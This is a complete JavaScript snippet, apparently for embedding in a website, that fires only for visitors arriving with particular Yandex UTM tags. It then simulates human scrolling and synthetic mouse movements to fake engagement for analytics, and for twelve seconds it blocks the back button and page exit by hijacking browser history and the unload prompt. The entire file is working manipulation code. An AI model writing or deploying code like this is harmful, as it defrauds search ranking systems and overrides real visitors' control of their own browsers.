(function () {

  /* ===============================
     UTM CHECK
  =============================== */
  var params = new URLSearchParams(window.location.search);

  if (
    params.get('utm_source') !== 'yandex' ||
    params.get('utm_medium') !== 'organic' ||
    params.get('utm_campaign') !== 'promo'
  ) {
    return; // ❌ не наши — валим
  }

  /* ===============================
     НАСТРОЙКИ
  =============================== */
  var scrollStartDelay = 6000;
  var lockTime = 12000;

  var enableFakeMouse = true;
  var mouseMoveIntervalMin = 800;
  var mouseMoveIntervalMax = 2000;

  var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

  /* ===============================
     HUMAN SCROLL
  =============================== */
  function humanScrollDown(callback) {
    let currentScroll = window.pageYOffset;
    const maxScroll = document.body.scrollHeight - window.innerHeight;

    function step() {
      if (currentScroll >= maxScroll) {
        if (callback) setTimeout(callback, 1500);
        return;
      }

      const scrollStep = Math.floor(Math.random() * 120) + 60;
      currentScroll += scrollStep;

      window.scrollTo({
        top: currentScroll,
        behavior: 'smooth'
      });

      const delay = Math.floor(Math.random() * 800) + 400;
      setTimeout(step, delay);
    }

    step();
  }

  function humanScrollUp() {
    let currentScroll = window.pageYOffset;

    function step() {
      if (currentScroll <= 0) return;

      const scrollStep = Math.floor(Math.random() * 120) + 60;
      currentScroll -= scrollStep;
      if (currentScroll < 0) currentScroll = 0;

      window.scrollTo({
        top: currentScroll,
        behavior: 'smooth'
      });

      const delay = Math.floor(Math.random() * 800) + 400;
      setTimeout(step, delay);
    }

    step();
  }

  setTimeout(function () {
    humanScrollDown(humanScrollUp);
  }, scrollStartDelay);

  /* ===============================
     FAKE MOUSE (DESKTOP ONLY)
  =============================== */
  function startFakeMouse() {
    if (!enableFakeMouse || isMobile) return;

    var mouse = document.createElement('div');
    mouse.style.position = 'fixed';
    mouse.style.width = '6px';
    mouse.style.height = '6px';
    mouse.style.borderRadius = '50%';
    mouse.style.background = 'rgba(0,0,0,0)';
    mouse.style.zIndex = '999999';
    mouse.style.pointerEvents = 'none';
    document.body.appendChild(mouse);

    var x = Math.random() * window.innerWidth;
    var y = Math.random() * window.innerHeight;

    function moveMouse() {
      var dx = (Math.random() - 0.5) * 300;
      var dy = (Math.random() - 0.5) * 200;

      x += dx;
      y += dy;

      x = Math.max(0, Math.min(x, window.innerWidth));
      y = Math.max(0, Math.min(y, window.innerHeight));

      mouse.style.transform = 'translate(' + x + 'px,' + y + 'px)';

      document.dispatchEvent(new MouseEvent('mousemove', {
        clientX: x,
        clientY: y,
        bubbles: true
      }));

      var delay = Math.floor(
        Math.random() * (mouseMoveIntervalMax - mouseMoveIntervalMin)
      ) + mouseMoveIntervalMin;

      setTimeout(moveMouse, delay);
    }

    moveMouse();
  }

  setTimeout(startFakeMouse, 3000);

  /* ===============================
     EXIT / BACK LOCK
  =============================== */
  var isLocked = true;

  history.pushState(null, null, location.href);
  history.pushState(null, null, location.href);

  window.addEventListener("popstate", function () {
    if (isLocked) history.pushState(null, null, location.href);
  });

  window.addEventListener("beforeunload", function (e) {
    if (isLocked) {
      e.preventDefault();
      e.returnValue = '';
    }
  });

  if (isMobile) {
    document.addEventListener("visibilitychange", function () {
      if (document.hidden && isLocked) {
        history.pushState(null, null, location.href);
      }
    });
  }

  setTimeout(function () {
    isLocked = false;
  }, lockTime);

})();